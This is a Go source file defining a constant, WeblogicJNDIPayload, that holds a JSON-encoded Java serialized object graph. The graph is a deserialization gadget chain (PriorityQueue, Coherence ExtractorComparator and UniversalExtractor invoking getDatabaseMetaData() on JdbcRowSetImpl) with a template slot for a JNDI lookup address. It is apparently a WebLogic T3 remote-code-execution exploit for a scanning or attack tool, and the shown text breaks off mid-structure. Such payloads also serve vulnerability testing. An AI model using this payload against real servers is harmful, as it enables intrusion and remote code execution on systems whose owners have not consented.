package t3

const WeblogicJNDIPayload = `[
  {
    "type": 115,
    "type_verbose": "TC_OBJECT",
    "class_desc": {
      "type": 0,
      "type_verbose": "X_CLASSDESC",
      "detail": {
        "type": 114,
        "type_verbose": "TC_CLASSDESC",
        "is_null": false,
        "class_name": "java.util.PriorityQueue",
        "serial_version": "lNowtPs/grE=",
        "handle": 8257536,
        "desc_flag": 3,
        "fields": {
          "type": 0,
          "type_verbose": "X_CLASSFIELDS",
          "field_count": 2,
          "fields": [
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "size",
              "field_type": 73,
              "field_type_verbose": "int",
              "class_name_1": null
            },
            {
              "type": 0,
              "type_verbose": "X_CLASSFIELD",
              "name": "comparator",
              "field_type": 76,
              "field_type_verbose": "object",
              "class_name_1": {
                "type": 116,
                "type_verbose": "TC_STRING",
                "is_long": false,
                "size": 22,
                "raw": "TGphdmEvdXRpbC9Db21wYXJhdG9yOw==",
                "value": "Ljava/util/Comparator;",
                "handle": 0
              }
            }
          ]
        },
        "annotations": null,
        "super_class": {
          "type": 112,
          "type_verbose": "TC_NULL"
        },
        "dynamic_proxy_class": false,
        "dynamic_proxy_class_interface_count": 0,
        "dynamic_proxy_annotation": null,
        "dynamic_proxy_class_interface_names": null
      }
    },
    "class_data": [
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": null,
        "block_data": null
      },
      {
        "type": 0,
        "type_verbose": "X_CLASSDATA",
        "fields": [
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 73,
            "field_type_verbose": "int",
            "bytes": "AAAAAg=="
          },
          {
            "type": 0,
            "type_verbose": "X_FIELDVALUE",
            "field_type": 76,
            "field_type_verbose": "object",
            "object": {
              "type": 115,
              "type_verbose": "TC_OBJECT",
              "class_desc": {
                "type": 0,
                "type_verbose": "X_CLASSDESC",
                "detail": {
                  "type": 114,
                  "type_verbose": "TC_CLASSDESC",
                  "is_null": false,
                  "class_name": "com.tangosol.util.comparator.ExtractorComparator",
                  "serial_version": "+bO8WMxSzSE=",
                  "handle": 8257539,
                  "desc_flag": 2,
                  "fields": {
                    "type": 0,
                    "type_verbose": "X_CLASSFIELDS",
                    "field_count": 1,
                    "fields": [
                      {
                        "type": 0,
                        "type_verbose": "X_CLASSFIELD",
                        "name": "m_extractor",
                        "field_type": 76,
                        "field_type_verbose": "object",
                        "class_name_1": {
                          "type": 116,
                          "type_verbose": "TC_STRING",
                          "is_long": false,
                          "size": 34,
                          "raw": "TGNvbS90YW5nb3NvbC91dGlsL1ZhbHVlRXh0cmFjdG9yOw==",
                          "value": "Lcom/tangosol/util/ValueExtractor;",
                          "handle": 0
                        }
                      }
                    ]
                  },
                  "annotations": null,
                  "super_class": {
                    "type": 112,
                    "type_verbose": "TC_NULL"
                  },
                  "dynamic_proxy_class": false,
                  "dynamic_proxy_class_interface_count": 0,
                  "dynamic_proxy_annotation": null,
                  "dynamic_proxy_class_interface_names": null
                }
              },
              "class_data": [
                {
                  "type": 0,
                  "type_verbose": "X_CLASSDATA",
                  "fields": null,
                  "block_data": null
                },
                {
                  "type": 0,
                  "type_verbose": "X_CLASSDATA",
                  "fields": [
                    {
                      "type": 0,
                      "type_verbose": "X_FIELDVALUE",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "object": {
                        "type": 115,
                        "type_verbose": "TC_OBJECT",
                        "class_desc": {
                          "type": 0,
                          "type_verbose": "X_CLASSDESC",
                          "detail": {
                            "type": 114,
                            "type_verbose": "TC_CLASSDESC",
                            "is_null": false,
                            "class_name": "com.tangosol.util.extractor.UniversalExtractor",
                            "serial_version": "DcR3v/9L8Yw=",
                            "handle": 8257542,
                            "desc_flag": 2,
                            "fields": {
                              "type": 0,
                              "type_verbose": "X_CLASSFIELDS",
                              "field_count": 2,
                              "fields": [
                                {
                                  "type": 0,
                                  "type_verbose": "X_CLASSFIELD",
                                  "name": "m_aoParam",
                                  "field_type": 91,
                                  "field_type_verbose": "array",
                                  "class_name_1": {
                                    "type": 116,
                                    "type_verbose": "TC_STRING",
                                    "is_long": false,
                                    "size": 19,
                                    "raw": "W0xqYXZhL2xhbmcvT2JqZWN0Ow==",
                                    "value": "[Ljava/lang/Object;",
                                    "handle": 0
                                  }
                                },
                                {
                                  "type": 0,
                                  "type_verbose": "X_CLASSFIELD",
                                  "name": "m_sName",
                                  "field_type": 76,
                                  "field_type_verbose": "object",
                                  "class_name_1": {
                                    "type": 116,
                                    "type_verbose": "TC_STRING",
                                    "is_long": false,
                                    "size": 18,
                                    "raw": "TGphdmEvbGFuZy9TdHJpbmc7",
                                    "value": "Ljava/lang/String;",
                                    "handle": 0
                                  }
                                }
                              ]
                            },
                            "annotations": null,
                            "super_class": {
                              "type": 0,
                              "type_verbose": "X_CLASSDESC",
                              "detail": {
                                "type": 114,
                                "type_verbose": "TC_CLASSDESC",
                                "is_null": false,
                                "class_name": "com.tangosol.util.extractor.AbstractExtractor",
                                "serial_version": "mxvhjtcBAOU=",
                                "handle": 8257545,
                                "desc_flag": 2,
                                "fields": {
                                  "type": 0,
                                  "type_verbose": "X_CLASSFIELDS",
                                  "field_count": 1,
                                  "fields": [
                                    {
                                      "type": 0,
                                      "type_verbose": "X_CLASSFIELD",
                                      "name": "m_nTarget",
                                      "field_type": 73,
                                      "field_type_verbose": "int",
                                      "class_name_1": null
                                    }
                                  ]
                                },
                                "annotations": null,
                                "super_class": {
                                  "type": 112,
                                  "type_verbose": "TC_NULL"
                                },
                                "dynamic_proxy_class": false,
                                "dynamic_proxy_class_interface_count": 0,
                                "dynamic_proxy_annotation": null,
                                "dynamic_proxy_class_interface_names": null
                              }
                            },
                            "dynamic_proxy_class": false,
                            "dynamic_proxy_class_interface_count": 0,
                            "dynamic_proxy_annotation": null,
                            "dynamic_proxy_class_interface_names": null
                          }
                        },
                        "class_data": [
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSDATA",
                            "fields": null,
                            "block_data": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSDATA",
                            "fields": [
                              {
                                "type": 0,
                                "type_verbose": "X_FIELDVALUE",
                                "field_type": 73,
                                "field_type_verbose": "int",
                                "bytes": "AAAAAQ=="
                              }
                            ],
                            "block_data": null
                          },
                          {
                            "type": 0,
                            "type_verbose": "X_CLASSDATA",
                            "fields": [
                              {
                                "type": 0,
                                "type_verbose": "X_FIELDVALUE",
                                "field_type": 91,
                                "field_type_verbose": "array",
                                "object": {
                                  "type": 112,
                                  "type_verbose": "TC_NULL"
                                }
                              },
                              {
                                "type": 0,
                                "type_verbose": "X_FIELDVALUE",
                                "field_type": 76,
                                "field_type_verbose": "object",
                                "object": {
                                  "type": 116,
                                  "type_verbose": "TC_STRING",
                                  "is_long": false,
                                  "size": 21,
                                  "raw": "Z2V0RGF0YWJhc2VNZXRhRGF0YSgp",
                                  "value": "getDatabaseMetaData()",
                                  "handle": 0
                                }
                              }
                            ],
                            "block_data": null
                          }
                        ],
                        "handle": 8257546
                      }
                    }
                  ],
                  "block_data": null
                }
              ],
              "handle": 8257541
            }
          }
        ],
        "block_data": [
          {
            "type": 119,
            "type_verbose": "TC_BLOCKDATA",
            "is_long": false,
            "size": 4,
            "contents": "AAAAAw=="
          },
          {
            "type": 115,
            "type_verbose": "TC_OBJECT",
            "class_desc": {
              "type": 0,
              "type_verbose": "X_CLASSDESC",
              "detail": {
                "type": 114,
                "type_verbose": "TC_CLASSDESC",
                "is_null": false,
                "class_name": "com.sun.rowset.JdbcRowSetImpl",
                "serial_version": "zibYH0lzwgU=",
                "handle": 8257548,
                "desc_flag": 2,
                "fields": {
                  "type": 0,
                  "type_verbose": "X_CLASSFIELDS",
                  "field_count": 7,
                  "fields": [
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "conn",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "class_name_1": {
                        "type": 116,
                        "type_verbose": "TC_STRING",
                        "is_long": false,
                        "size": 21,
                        "raw": "TGphdmEvc3FsL0Nvbm5lY3Rpb247",
                        "value": "Ljava/sql/Connection;",
                        "handle": 0
                      }
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "iMatchColumns",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "class_name_1": {
                        "type": 116,
                        "type_verbose": "TC_STRING",
                        "is_long": false,
                        "size": 18,
                        "raw": "TGphdmEvdXRpbC9WZWN0b3I7",
                        "value": "Ljava/util/Vector;",
                        "handle": 0
                      }
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "ps",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "class_name_1": {
                        "type": 116,
                        "type_verbose": "TC_STRING",
                        "is_long": false,
                        "size": 28,
                        "raw": "TGphdmEvc3FsL1ByZXBhcmVkU3RhdGVtZW50Ow==",
                        "value": "Ljava/sql/PreparedStatement;",
                        "handle": 0
                      }
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "resMD",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "class_name_1": {
                        "type": 116,
                        "type_verbose": "TC_STRING",
                        "is_long": false,
                        "size": 28,
                        "raw": "TGphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhOw==",
                        "value": "Ljava/sql/ResultSetMetaData;",
                        "handle": 0
                      }
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "rowsMD",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "class_name_1": {
                        "type": 116,
                        "type_verbose": "TC_STRING",
                        "is_long": false,
                        "size": 37,
                        "raw": "TGphdmF4L3NxbC9yb3dzZXQvUm93U2V0TWV0YURhdGFJbXBsOw==",
                        "value": "Ljavax/sql/rowset/RowSetMetaDataImpl;",
                        "handle": 0
                      }
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "rs",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "class_name_1": {
                        "type": 116,
                        "type_verbose": "TC_STRING",
                        "is_long": false,
                        "size": 20,
                        "raw": "TGphdmEvc3FsL1Jlc3VsdFNldDs=",
                        "value": "Ljava/sql/ResultSet;",
                        "handle": 0
                      }
                    },
                    {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELD",
                      "name": "strMatchColumns",
                      "field_type": 76,
                      "field_type_verbose": "object",
                      "class_name_1": {
                        "type": 113,
                        "type_verbose": "TC_REFERENCE",
                        "value": "AH4ADg==",
                        "handle": 8257550
                      }
                    }
                  ]
                },
                "annotations": null,
                "super_class": {
                  "type": 0,
                  "type_verbose": "X_CLASSDESC",
                  "detail": {
                    "type": 114,
                    "type_verbose": "TC_CLASSDESC",
                    "is_null": false,
                    "class_name": "javax.sql.rowset.BaseRowSet",
                    "serial_version": "Q9EdpU3CseA=",
                    "handle": 8257555,
                    "desc_flag": 2,
                    "fields": {
                      "type": 0,
                      "type_verbose": "X_CLASSFIELDS",
                      "field_count": 21,
                      "fields": [
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "concurrency",
                          "field_type": 73,
                          "field_type_verbose": "int",
                          "class_name_1": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "escapeProcessing",
                          "field_type": 90,
                          "field_type_verbose": "boolean",
                          "class_name_1": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "fetchDir",
                          "field_type": 73,
                          "field_type_verbose": "int",
                          "class_name_1": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "fetchSize",
                          "field_type": 73,
                          "field_type_verbose": "int",
                          "class_name_1": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "isolation",
                          "field_type": 73,
                          "field_type_verbose": "int",
                          "class_name_1": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "maxFieldSize",
                          "field_type": 73,
                          "field_type_verbose": "int",
                          "class_name_1": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "maxRows",
                          "field_type": 73,
                          "field_type_verbose": "int",
                          "class_name_1": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "queryTimeout",
                          "field_type": 73,
                          "field_type_verbose": "int",
                          "class_name_1": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "readOnly",
                          "field_type": 90,
                          "field_type_verbose": "boolean",
                          "class_name_1": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "rowSetType",
                          "field_type": 73,
                          "field_type_verbose": "int",
                          "class_name_1": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "showDeleted",
                          "field_type": 90,
                          "field_type_verbose": "boolean",
                          "class_name_1": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "URL",
                          "field_type": 76,
                          "field_type_verbose": "object",
                          "class_name_1": {
                            "type": 113,
                            "type_verbose": "TC_REFERENCE",
                            "value": "AH4ACA==",
                            "handle": 8257544
                          }
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "asciiStream",
                          "field_type": 76,
                          "field_type_verbose": "object",
                          "class_name_1": {
                            "type": 116,
                            "type_verbose": "TC_STRING",
                            "is_long": false,
                            "size": 21,
                            "raw": "TGphdmEvaW8vSW5wdXRTdHJlYW07",
                            "value": "Ljava/io/InputStream;",
                            "handle": 0
                          }
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "binaryStream",
                          "field_type": 76,
                          "field_type_verbose": "object",
                          "class_name_1": {
                            "type": 113,
                            "type_verbose": "TC_REFERENCE",
                            "value": "AH4AFA==",
                            "handle": 8257556
                          }
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "charStream",
                          "field_type": 76,
                          "field_type_verbose": "object",
                          "class_name_1": {
                            "type": 116,
                            "type_verbose": "TC_STRING",
                            "is_long": false,
                            "size": 16,
                            "raw": "TGphdmEvaW8vUmVhZGVyOw==",
                            "value": "Ljava/io/Reader;",
                            "handle": 0
                          }
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "command",
                          "field_type": 76,
                          "field_type_verbose": "object",
                          "class_name_1": {
                            "type": 113,
                            "type_verbose": "TC_REFERENCE",
                            "value": "AH4ACA==",
                            "handle": 8257544
                          }
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "dataSource",
                          "field_type": 76,
                          "field_type_verbose": "object",
                          "class_name_1": {
                            "type": 113,
                            "type_verbose": "TC_REFERENCE",
                            "value": "AH4ACA==",
                            "handle": 8257544
                          }
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "listeners",
                          "field_type": 76,
                          "field_type_verbose": "object",
                          "class_name_1": {
                            "type": 113,
                            "type_verbose": "TC_REFERENCE",
                            "value": "AH4ADg==",
                            "handle": 8257550
                          }
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "map",
                          "field_type": 76,
                          "field_type_verbose": "object",
                          "class_name_1": {
                            "type": 116,
                            "type_verbose": "TC_STRING",
                            "is_long": false,
                            "size": 15,
                            "raw": "TGphdmEvdXRpbC9NYXA7",
                            "value": "Ljava/util/Map;",
                            "handle": 0
                          }
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "params",
                          "field_type": 76,
                          "field_type_verbose": "object",
                          "class_name_1": {
                            "type": 116,
                            "type_verbose": "TC_STRING",
                            "is_long": false,
                            "size": 21,
                            "raw": "TGphdmEvdXRpbC9IYXNodGFibGU7",
                            "value": "Ljava/util/Hashtable;",
                            "handle": 0
                          }
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSFIELD",
                          "name": "unicodeStream",
                          "field_type": 76,
                          "field_type_verbose": "object",
                          "class_name_1": {
                            "type": 113,
                            "type_verbose": "TC_REFERENCE",
                            "value": "AH4AFA==",
                            "handle": 8257556
                          }
                        }
                      ]
                    },
                    "annotations": null,
                    "super_class": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    },
                    "dynamic_proxy_class": false,
                    "dynamic_proxy_class_interface_count": 0,
                    "dynamic_proxy_annotation": null,
                    "dynamic_proxy_class_interface_names": null
                  }
                },
                "dynamic_proxy_class": false,
                "dynamic_proxy_class_interface_count": 0,
                "dynamic_proxy_annotation": null,
                "dynamic_proxy_class_interface_names": null
              }
            },
            "class_data": [
              {
                "type": 0,
                "type_verbose": "X_CLASSDATA",
                "fields": null,
                "block_data": null
              },
              {
                "type": 0,
                "type_verbose": "X_CLASSDATA",
                "fields": [
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "bytes": "AAAD8A=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 90,
                    "field_type_verbose": "boolean",
                    "bytes": "AQ=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "bytes": "AAAD6A=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "bytes": "AAAAAA=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "bytes": "AAAAAg=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "bytes": "AAAAAA=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "bytes": "AAAAAA=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "bytes": "AAAAAA=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 90,
                    "field_type_verbose": "boolean",
                    "bytes": "AQ=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 73,
                    "field_type_verbose": "int",
                    "bytes": "AAAD7A=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 90,
                    "field_type_verbose": "boolean",
                    "bytes": "AA=="
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 116,
                      "type_verbose": "TC_STRING",
                      "is_long": false,
                      "size": {{ .size }},
                      "raw": "{{ .raw }}",
                      "value": "{{ .value }}",
                      "handle": 0
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 115,
                      "type_verbose": "TC_OBJECT",
                      "class_desc": {
                        "type": 0,
                        "type_verbose": "X_CLASSDESC",
                        "detail": {
                          "type": 114,
                          "type_verbose": "TC_CLASSDESC",
                          "is_null": false,
                          "class_name": "java.util.Vector",
                          "serial_version": "2Zd9W4A7rwE=",
                          "handle": 8257562,
                          "desc_flag": 3,
                          "fields": {
                            "type": 0,
                            "type_verbose": "X_CLASSFIELDS",
                            "field_count": 3,
                            "fields": [
                              {
                                "type": 0,
                                "type_verbose": "X_CLASSFIELD",
                                "name": "capacityIncrement",
                                "field_type": 73,
                                "field_type_verbose": "int",
                                "class_name_1": null
                              },
                              {
                                "type": 0,
                                "type_verbose": "X_CLASSFIELD",
                                "name": "elementCount",
                                "field_type": 73,
                                "field_type_verbose": "int",
                                "class_name_1": null
                              },
                              {
                                "type": 0,
                                "type_verbose": "X_CLASSFIELD",
                                "name": "elementData",
                                "field_type": 91,
                                "field_type_verbose": "array",
                                "class_name_1": {
                                  "type": 113,
                                  "type_verbose": "TC_REFERENCE",
                                  "value": "AH4ABw==",
                                  "handle": 8257543
                                }
                              }
                            ]
                          },
                          "annotations": null,
                          "super_class": {
                            "type": 112,
                            "type_verbose": "TC_NULL"
                          },
                          "dynamic_proxy_class": false,
                          "dynamic_proxy_class_interface_count": 0,
                          "dynamic_proxy_annotation": null,
                          "dynamic_proxy_class_interface_names": null
                        }
                      },
                      "class_data": [
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSDATA",
                          "fields": null,
                          "block_data": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSDATA",
                          "fields": [
                            {
                              "type": 0,
                              "type_verbose": "X_FIELDVALUE",
                              "field_type": 73,
                              "field_type_verbose": "int",
                              "bytes": "AAAAAA=="
                            },
                            {
                              "type": 0,
                              "type_verbose": "X_FIELDVALUE",
                              "field_type": 73,
                              "field_type_verbose": "int",
                              "bytes": "AAAAAA=="
                            },
                            {
                              "type": 0,
                              "type_verbose": "X_FIELDVALUE",
                              "field_type": 91,
                              "field_type_verbose": "array",
                              "object": {
                                "type": 117,
                                "type_verbose": "TC_ARRAY",
                                "class_desc": {
                                  "type": 0,
                                  "type_verbose": "X_CLASSDESC",
                                  "detail": {
                                    "type": 114,
                                    "type_verbose": "TC_CLASSDESC",
                                    "is_null": false,
                                    "class_name": "[Ljava.lang.Object;",
                                    "serial_version": "kM5YnxBzKWw=",
                                    "handle": 8257564,
                                    "desc_flag": 2,
                                    "fields": {
                                      "type": 0,
                                      "type_verbose": "X_CLASSFIELDS",
                                      "field_count": 0,
                                      "fields": null
                                    },
                                    "annotations": null,
                                    "super_class": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    },
                                    "dynamic_proxy_class": false,
                                    "dynamic_proxy_class_interface_count": 0,
                                    "dynamic_proxy_annotation": null,
                                    "dynamic_proxy_class_interface_names": null
                                  }
                                },
                                "size": 10,
                                "values": [
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  },
                                  {
                                    "type": 0,
                                    "type_verbose": "X_FIELDVALUE",
                                    "field_type": 76,
                                    "field_type_verbose": "object",
                                    "object": {
                                      "type": 112,
                                      "type_verbose": "TC_NULL"
                                    }
                                  }
                                ],
                                "handle": 8257565
                              }
                            }
                          ],
                          "block_data": [
                            {
                              "type": 120,
                              "type_verbose": "TC_ENDBLOCKDATA"
                            }
                          ]
                        }
                      ],
                      "handle": 8257563
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 115,
                      "type_verbose": "TC_OBJECT",
                      "class_desc": {
                        "type": 0,
                        "type_verbose": "X_CLASSDESC",
                        "detail": {
                          "type": 114,
                          "type_verbose": "TC_CLASSDESC",
                          "is_null": false,
                          "class_name": "java.util.Hashtable",
                          "serial_version": "E7sPJSFK5Lg=",
                          "handle": 8257566,
                          "desc_flag": 3,
                          "fields": {
                            "type": 0,
                            "type_verbose": "X_CLASSFIELDS",
                            "field_count": 2,
                            "fields": [
                              {
                                "type": 0,
                                "type_verbose": "X_CLASSFIELD",
                                "name": "loadFactor",
                                "field_type": 70,
                                "field_type_verbose": "float",
                                "class_name_1": null
                              },
                              {
                                "type": 0,
                                "type_verbose": "X_CLASSFIELD",
                                "name": "threshold",
                                "field_type": 73,
                                "field_type_verbose": "int",
                                "class_name_1": null
                              }
                            ]
                          },
                          "annotations": null,
                          "super_class": {
                            "type": 112,
                            "type_verbose": "TC_NULL"
                          },
                          "dynamic_proxy_class": false,
                          "dynamic_proxy_class_interface_count": 0,
                          "dynamic_proxy_annotation": null,
                          "dynamic_proxy_class_interface_names": null
                        }
                      },
                      "class_data": [
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSDATA",
                          "fields": null,
                          "block_data": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSDATA",
                          "fields": [
                            {
                              "type": 0,
                              "type_verbose": "X_FIELDVALUE",
                              "field_type": 70,
                              "field_type_verbose": "float",
                              "bytes": "P0AAAA=="
                            },
                            {
                              "type": 0,
                              "type_verbose": "X_FIELDVALUE",
                              "field_type": 73,
                              "field_type_verbose": "int",
                              "bytes": "AAAACA=="
                            }
                          ],
                          "block_data": [
                            {
                              "type": 119,
                              "type_verbose": "TC_BLOCKDATA",
                              "is_long": false,
                              "size": 8,
                              "contents": "AAAACwAAAAA="
                            },
                            {
                              "type": 120,
                              "type_verbose": "TC_ENDBLOCKDATA"
                            }
                          ]
                        }
                      ],
                      "handle": 8257567
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  }
                ],
                "block_data": null
              },
              {
                "type": 0,
                "type_verbose": "X_CLASSDATA",
                "fields": [
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 112,
                      "type_verbose": "TC_NULL"
                    }
                  },
                  {
                    "type": 0,
                    "type_verbose": "X_FIELDVALUE",
                    "field_type": 76,
                    "field_type_verbose": "object",
                    "object": {
                      "type": 115,
                      "type_verbose": "TC_OBJECT",
                      "class_desc": {
                        "type": 113,
                        "type_verbose": "TC_REFERENCE",
                        "value": "AH4AGg==",
                        "handle": 8257562
                      },
                      "class_data": [
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSDATA",
                          "fields": null,
                          "block_data": null
                        },
                        {
                          "type": 0,
                          "type_verbose": "X_CLASSDATA",
                          "fields": [
                            {
                              "type": 0,
                              "type_verbose": "X_FIELDVALUE",
                              "field_type": 73,
                              "field_type_verbose": "int",
                              "bytes": "AAAAAA=="
                            },
                            {
                              "type": 0,
                              "type_verbose": "X_FIELDVALUE",
                              "field_type": 73,
                              "field_type_verbose": "int",
                              "bytes": "AAAACg=="
                            },
                            {
                              "type": 0,
                              "type_verbose": "X_FIELDVALUE",
                              "field_type": 91,
                              "field_type_verbose": "array",
                              "object": {
                                "type": 117,
                                "type_verbose": "TC_ARRAY",
                                "class_desc": {
                                  "type": 113,
                                  "type_verbose": "TC_REFERENCE",
                                  "value": "AH4AHA==",
                                  "handle": 8257564
                                },
                                "size": 10,
                                "values": [
